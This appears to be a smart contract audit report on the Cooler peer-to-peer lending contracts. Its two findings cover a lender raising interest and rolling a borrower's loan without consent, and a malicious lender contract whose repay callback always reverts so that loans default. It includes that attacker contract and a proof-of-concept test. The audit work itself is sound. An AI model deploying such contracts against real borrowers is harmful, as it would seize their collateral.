# M1 - Borrower has no choice whether to roll a loan. Lender could propose extreamly large interest rate, which will benefit the lender.

## Summary

Currently the cooler provides a functionallity, for a lender to propose new conditions for a loan and another function (supposed to be for the borrower, but anyone can call it. Even in the same trx as the one from the lender), which accept the new terms and modify the loan properties. If the intereset is changed, the user, who roll the loan don't have to pay anything, but the loan.amount is being increased in advantage to the lender.

## Vulnerabilities Details

The severity is high, because the attack is easy to implement from a regular lender for each p2p cooler contract.
Here is the flow of the events. Assuming 1ETH = $2 000

1. Alice create a cooler, where she wants to borrow ETH and gives USDC as collateral. She creates initial request, where the want to borrow `1 ETH` with interest of `5%` (which is 1/20 ETH for a year), duration of `1 year` and `loanToCollateral of 3000` (150% value of the borrowed assets). So the amount, which Alice is okay to pay is back is 1.05 ETH ($2 100) for her loan of 1 ETH over the year.
2. The problem arises when maliciously intended Eve want to take advantage from Alice and the contract code:

```solidity
  function provideNewTermsForRoll(
        uint256 loanID_,
        uint256 interest_,
        uint256 loanToCollateral_,
        uint256 duration_
    ) external {
        Loan storage loan = loans[loanID_];
        if (msg.sender != loan.lender) revert OnlyApproved();
	// Here Eve provide extremly large interest rate (let's say 200%)
        loan.request =
            Request(
                loan.amount,
                interest_,
                loanToCollateral_,
                duration_,
                true
            );
    }
```

- Eve clears the request by creating transffering Alice 1 ETH
- In one transaction Eve could propose new terms with no regulated interest value (it could go 100000% and more) and also accept those terms by calling `rollLoan()`

```
 // @audit Why everybody can roll a loan?

        // Check whether rolling the loan requires pledging more collateral or not (if there was a previous repayment).
        uint256 newCollateral = newCollateralFor(loanID_);
        uint256 newDebt = interestFor(loan.amount, loan.request.interest, loan.request.duration);

        // Update memory accordingly.
        loan.amount += newDebt;
        loan.collateral += newCollateral;
        loan.expiry += loan.request.duration;
        loan.request.active = false;

        // Save updated loan info in storage.
        loans[loanID_] = loan;

        if (newCollateral > 0) {
            collateral().safeTransferFrom(msg.sender, address(this), newCollateral);
        }
```

- This operation is free for Eve, because she doesn't provide new loanToCollateral value, instead the function will increase loan.amount, which will manipulate decollateralized value in the `repayLoan` function, when Alice try to return her loan, which will lead to great loss of Alice funds.
- - The best case scenario for her here is she looses only 50% of her initial collateral in value, if she leave the loan to be defaulted
- - Worse - she may miss that the terms are now changed and try to repay her 1 ETH back, which for new interest of (100000%) will decollaterize her 3 USDC (3000 (collateral) _ 1 (repaid) / 1000 (amount after the new interest))
    `uint256 decollateralized = (loan.collateral _ repaid\_) / loan.amount;`. So now she payed 1 ETH($2000) for $3 to the lender, who will later default $2997 from the collateral.

## Impact

- Borrowers paying too large interest back (almost certainly so large that they would prefer to loose their collateral funds)
- loan.amount being manipulated and so borrower lost funds in collateral or even borrowed asset, if they try to repay it.

## Recomendation

Be sure to check that only owner could roll the loan, after the lender has proposed so:

```
 function rollLoan(uint256 loanID_) external {
        Loan memory loan = loans[loanID_];
				// Add the following check
				if(msg.sender != owner) revert OnlyApproved();
        if (block.timestamp > loan.expiry) revert Default();
        if (!loan.request.active) revert NotRollable();
        // @audit Why everybody can roll a loan?
				...
```

# M2 - Malicious lender could DoS repay functionallity and always default loans.

## Summary

An attacker could implement `onRepay()` callback function to always revert and DoS the option for borrower to repay his loan and collect his collateral, which will always have greater value for the lender.

## Vulnerabilities Details

The only thing, which the attacker should do is implement a malicious contract, which implemnts `CoolerCallback` as follows:

```
contract MockMaliciousLender is CoolerCallback {
    constructor(address coolerFactory_) CoolerCallback(coolerFactory_) {}

    /// @notice Callback function that handles repayments. Override for custom logic.
    function _onRepay(uint256 loanID_, uint256 amount_) internal override {
        revert("You just got hacked.");
    }

    /// @notice Callback function that handles rollovers.
    function _onRoll(uint256 loanID_, uint256 newDebt, uint256 newCollateral) internal override {}

    /// @notice Callback function that handles defaults.
    function _onDefault(uint256 loanID_, uint256 debt, uint256 collateral) internal override {}
}
```

Now whenever a user create a Cooler for given pair and request a loan, the hacker clears the loan request from the malicious contract choosing `clearRequest(
        uint256 reqID_ : {attack could do it for all},
        bool repayDirect_ : {doesn't matter},
        bool isCallback_ : true
    )`
And now the attacker just have to wait for the loan to be defaulted which is guaranteed, because it is not possible to be repaid, because rapay function calls the malicious callback:

```
    function repayLoan(uint256 loanID_, uint256 repaid_) external returns (uint256) {
        Loan memory loan = loans[loanID_];
    	...
        // Log the event.
        factory().newEvent(loanID_, CoolerFactory.Events.RepayLoan, repaid_);

        // @audit If a lender is the atack contract, which will revert on repay, it will make
        // impossible for the borrower to repay his loan, which will lead to the loan being always
        // defaulted, which for sure will profit for the lender, because he will claim the defaulted
        // collateral, which value is greater, than the lended.
        // If necessary, trigger lender callback.
        if (loan.callback) CoolerCallback(loan.lender).onRepay(loanID_, repaid_);
        return decollateralized;
```

This is a serious attack with possibility to break the system, because there are no conditions, which attacker should depend on to run it.
The attack could be used on each p2p token pair, hacker could use a bot to track for when a user create a new cooler and request a loan, then immediately clear the request using the malicious contract. This will always benefit the attacker, because always the provided collateral is with greater value, than the lended asset.

## Impact

- This could lead to broken p2p borrowing-lending functionallity, because using the attack the functionallity happens to be `trading with benefit for the lender, who collects his tokens after some time`.
- Lenders steal funds of the borrowers.

## PoC

Here is a test, which shows that the transaction always revert, and at the end the lender could withdraw.

```
    function testRevert_repay_DoS(uint256 amount_, uint256 repayAmount_) public {
        // test inputs
        repayAmount_ = bound(repayAmount_, 1e10, MAX_DEBT);  // min > 0 to have some decollateralization
        amount_ = bound(amount_, repayAmount_, MAX_DEBT);
        bool directRepay = true;
        bool callbackRepay = true;
        // test setup
        cooler = _initCooler();
        (uint256 reqID, ) = _requestLoan(amount_);

        // Create a malicious lender that reenters on defaults
        MockMaliciousLender attacker = new MockMaliciousLender(address(coolerFactory));
        deal(address(debt), address(attacker), amount_);

        vm.startPrank(address(attacker));
        // aprove debt so that it can be transferred from the cooler
        debt.approve(address(cooler), amount_);
        uint256 loanID = cooler.clearRequest(reqID, directRepay, callbackRepay);
        vm.stopPrank();

        // block.timestamp < loan expiry
        vm.warp(block.timestamp + DURATION / 2);

        vm.startPrank(owner);
        debt.approve(address(cooler), repayAmount_);
        // The owner (borrower) will now try to repay some part of his loan, but the transaction will always revert, since it
        // always executes code, which is written from the attacker. In this case 'revert', which will lead to loan being defaulted
        vm.expectRevert("You just got hacked.");
        cooler.repayLoan(loanID, repayAmount_);
        vm.stopPrank();

        vm.warp(block.timestamp + DURATION / 2 + 1);
        cooler.claimDefaulted(loanID);
        // The contract can have function to sent the assets to a EOA of the attacker and so on. Or if the hacker
        // wants to be really bad, he could implement this transfer inside "onDefaulted" function of the CoolerCallback.

    }
```

## Recomendations

- Think of a way to not execute external code inside important logic.
- One solution is to remove this callback functionallity and use internal utility functions inside the contracts (Cleaninghouse.sol) to do the same job (calculations.)
